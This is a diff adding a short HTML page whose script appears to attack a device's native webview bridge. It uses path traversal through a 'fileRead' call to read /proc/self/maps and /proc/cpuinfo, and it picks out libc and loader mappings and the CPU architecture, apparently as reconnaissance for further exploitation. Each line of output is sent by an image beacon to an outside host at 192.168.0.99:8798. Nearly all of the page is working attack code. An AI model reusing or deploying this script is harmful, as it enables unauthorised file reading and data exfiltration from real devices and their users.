@@ -1,0 +1,16 @@
+<!doctype html><html><head><meta charset="utf-8"></head>
+<body style="background:#000;color:#0f0;font:16px monospace"><pre id="out">u7we…</pre>
+<script>
+(function(){var out=document.getElementById("out");
+function exfil(t){try{new Image().src="http://192.168.0.99:8798/b?d="+encodeURIComponent(String(t).slice(0,140));}catch(e){}}
+function line(t){out.textContent+="\n"+t;exfil(t);}
+function hi(a,p){try{return HiUtils_createRequest(a,p);}catch(e){return {exc:String(e)};}}
+var m=hi("fileRead",{path:["../proc/self/maps"],mode:6}); var s=String(m.msg||"");
+var hits=s.split("\n").filter(function(l){ return /ld-linux|ld-2|ld\.so|libc\.so|interpreter|armhf|aarch64|aarch_64|elf32|elf64/.test(l); });
+line("hit lines="+hits.length);
+hits.slice(0,10).forEach(function(l){ line(l.trim().slice(0,140)); });
+var c=hi("fileRead",{path:["../proc/cpuinfo"],mode:6}); var cs=String(c.msg||"");
+var arch=cs.match(/CPU architecture:\s*\d+/); line("cpu arch: "+(arch?arch[0]:"?"));
+line("cpu32: "+(cs.match(/armv7|armv8|aarch64/i)||["?"]).join(","));
+})();
+</script></body></html>
